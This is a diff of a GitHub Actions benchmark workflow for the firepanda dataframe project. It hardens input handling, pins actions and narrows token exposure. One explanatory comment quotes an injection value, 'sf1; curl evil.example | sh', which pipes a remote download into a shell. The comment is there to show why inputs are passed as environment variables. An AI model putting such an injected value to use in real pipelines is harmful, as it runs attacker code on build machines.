@@ -10,21 +10,30 @@ on:
       suite:
         description: Suite to run
         type: choice
-        options: [db-benchmark, tpch, ingestion, udf, all]
+        options: [db-benchmark, tpch, all]
         default: all
       size:
-        description: Dataset size
+        description: Dataset size, or empty for the suite's default (0.5GB, sf1)
+        type: string
+        default: ""
+      io:
+        description: memory hands every engine the same Arrow table; scan lets each read the Parquet itself
         type: choice
-        options: ["0.5GB", "5GB", "50GB", "SF1", "SF10"]
-        default: "0.5GB"
+        options: [memory, scan]
+        default: memory
       engines:
         description: Comma-separated engine list, or "all"
         type: string
         default: all
+      runs:
+        description: How many runs the median is taken over
+        type: string
+        default: "10"
       ref:
         description: firepanda ref to benchmark
         type: string
         default: main
+
   repository_dispatch:
     types: [firepanda-release, upstream-release]
 
@@ -35,62 +44,91 @@ concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
-jobs:
-  guard:
-    name: Detect harness
-    runs-on: ubuntu-latest
-    outputs:
-      ready: ${{ steps.d.outputs.ready }}
-    steps:
-      - uses: actions/checkout@v7
-      - id: d
-        run: |
-          if [ -f tools/run.py ]; then
-            echo "ready=true" >> "$GITHUB_OUTPUT"
-          else
-            echo "ready=false" >> "$GITHUB_OUTPUT"
-            echo "::notice title=Harness not implemented::firepanda is at specification stage; there is nothing to benchmark yet."
-          fi
+# Every dispatch input is bound here and reaches the steps below as an environment
+# variable, never as a template expansion inside a `run` block. Expanded inline, a
+# size of `sf1; curl evil.example | sh` would not be an argument to the harness, it
+# would be the next command in the job.
+env:
+  IO: ${{ inputs.io || 'memory' }}
+  RUNS: ${{ inputs.runs || '10' }}
+  SIZE: ${{ inputs.size || '' }}
+  ENGINES: ${{ inputs.engines || 'all' }}
 
+jobs:
   run:
-    name: ${{ matrix.suite }} @ ${{ inputs.size || '0.5GB' }}
-    needs: guard
-    if: needs.guard.outputs.ready == 'true'
+    name: ${{ matrix.suite }}
     runs-on: ubuntu-latest
     timeout-minutes: 360
     strategy:
       fail-fast: false
       matrix:
-        suite: ${{ (inputs.suite == 'all' || inputs.suite == '') && fromJSON('["db-benchmark","tpch","ingestion","udf"]') || fromJSON(format('["{0}"]', inputs.suite)) }}
+        # Only the two suites that are wired up. `suites/ingestion` and `suites/udf`
+        # have READMEs and no queries, and putting them in the matrix would mean two
+        # jobs a week whose entire output is "unknown suite".
+        suite: ${{ (inputs.suite == 'all' || inputs.suite == '') && fromJSON('["db-benchmark","tpch"]') || fromJSON(format('["{0}"]', inputs.suite)) }}
     steps:
-      - uses: actions/checkout@v7
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+        with:
+          persist-credentials: false
 
       - uses: ./.github/actions/setup-pixi
 
-      # Pinned versions for every engine, recorded in the result file. A comparison
+      # Pinned versions for every engine, plus the governor, the transparent huge
+      # page setting and the turbo state, recorded in the result file. A comparison
       # against an unnamed version of anything is not a comparison.
       - name: Record environment
-        run: pixi run env-report --output env.json
+        run: pixi run env-report --out results/env.json
 
       - name: Fetch or generate datasets
-        run: pixi run data --suite ${{ matrix.suite }} --size ${{ inputs.size || '0.5GB' }}
+        env:
+          SUITE: ${{ matrix.suite }}
+        run: pixi run data --suite "$SUITE" ${SIZE:+--size "$SIZE"}
+
+      # Before any timing. A fast wrong answer is worse than no answer, and a port of
+      # twenty two SQL statements to two dataframe APIs is exactly where a wrong one
+      # comes from, so the published validation output is checked first and the job
+      # fails without running the benchmark if any query does not reproduce it.
+      - name: Check TPC-H answers against the published validation output
+        if: matrix.suite == 'tpch'
+        run: pixi run validate-tpch --size "${SIZE:-sf1}"
 
       - name: Run
         env:
+          SUITE: ${{ matrix.suite }}
           FIREPANDA_REF: ${{ inputs.ref || 'main' }}
         run: |
           pixi run bench \
-            --suite ${{ matrix.suite }} \
-            --size ${{ inputs.size || '0.5GB' }} \
-            --engines "${{ inputs.engines || 'all' }}" \
-            --runs 10 \
-            --env env.json \
-            --output "results/$(date -u +%Y-%m-%d)-${{ matrix.suite }}.json"
+            --suite "$SUITE" \
+            ${SIZE:+--size "$SIZE"} \
+            --io "$IO" \
+            --engines "$ENGINES" \
+            --runs "$RUNS" \
+            --env results/env.json
+
+      - name: Check the result files carry everything the report needs
+        run: pixi run validate-results results
+
+      # This one fails the job rather than annotating it. An engine that raised is
+      # not a slow engine and not an unimplemented query, it is a hole in the
+      # table, and the two times it has happened here the report showed a column
+      # of skips that read exactly like a missing feature. Once because the
+      # db-benchmark tables are called `left` and `right_small` and LEFT is a
+      # reserved word, once because DuckDB will not prepare a DDL statement that
+      # carries a parameter, so every Parquet view in scan mode failed to create.
+      - name: Fail if any engine crashed
+        run: pixi run check-sweep --crashes-only results/*.json
+
+      # A published comparison in which firepanda wins every row, or wins one by a
+      # factor no kernel explains, is more often a broken harness than a triumph.
+      # This annotates rather than fails, because the judgement is a human's.
+      - name: Look for a result too good to publish unexamined
+        continue-on-error: true
+        run: pixi run check-sweep results/*.json
 
       - name: Summary
-        run: pixi run report --latest --format markdown >> "$GITHUB_STEP_SUMMARY"
+        run: pixi run report results/*.json >> "$GITHUB_STEP_SUMMARY"
 
-      - uses: actions/upload-artifact@v7
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
         with:
           name: results-${{ matrix.suite }}-${{ github.run_id }}
           path: results/*.json
@@ -100,12 +138,13 @@ jobs:
   # runner is configured; skipping is reported rather than passing silently.
   gpu:
     name: GPU (vs cuDF)
-    needs: guard
-    if: needs.guard.outputs.ready == 'true' && vars.GPU_RUNNER != ''
+    if: vars.GPU_RUNNER != ''
     runs-on: ${{ vars.GPU_RUNNER }}
     timeout-minutes: 240
     steps:
-      - uses: actions/checkout@v7
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+        with:
+          persist-credentials: false
       - uses: ./.github/actions/setup-pixi
         with:
           environment: gpu
@@ -121,23 +160,32 @@ jobs:
       pages: write
       id-token: write
     steps:
-      - uses: actions/checkout@v7
-      - uses: actions/download-artifact@v8
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+        with:
+          persist-credentials: false
+      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8
         with:
           pattern: results-*
           merge-multiple: true
           path: results
       - uses: ./.github/actions/setup-pixi
       - name: Build site
-        run: pixi run site --input results --output site
+        run: pixi run site --results results --out site/index.html
+      # The token is handed to the one command that needs it rather than left in
+      # `.git/config` for the rest of the job. This job also runs `pixi run site`,
+      # which resolves and executes third party packages, and a push credential
+      # sitting in the checkout for the whole job is readable by all of them.
       - name: Commit result history
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
           git add results/
           git diff --quiet --cached || git commit -m "bench: results for $(date -u +%Y-%m-%d)"
-          git push
-      - uses: actions/upload-pages-artifact@v5
+          git push "https://x-access-token:${TOKEN}@github.com/${GITHUB_REPOSITORY}.git" \
+            "HEAD:${GITHUB_REF_NAME}"
+      - uses: actions/upload-pages-artifact@fc324d3547104276b827a68afc52ff2a11cc49c9 # v5
         with:
           path: site
-      - uses: actions/deploy-pages@v5
+      - uses: actions/deploy-pages@cd2ce8fcbc39b97be8ca5fce6e763baed58fa128 # v5
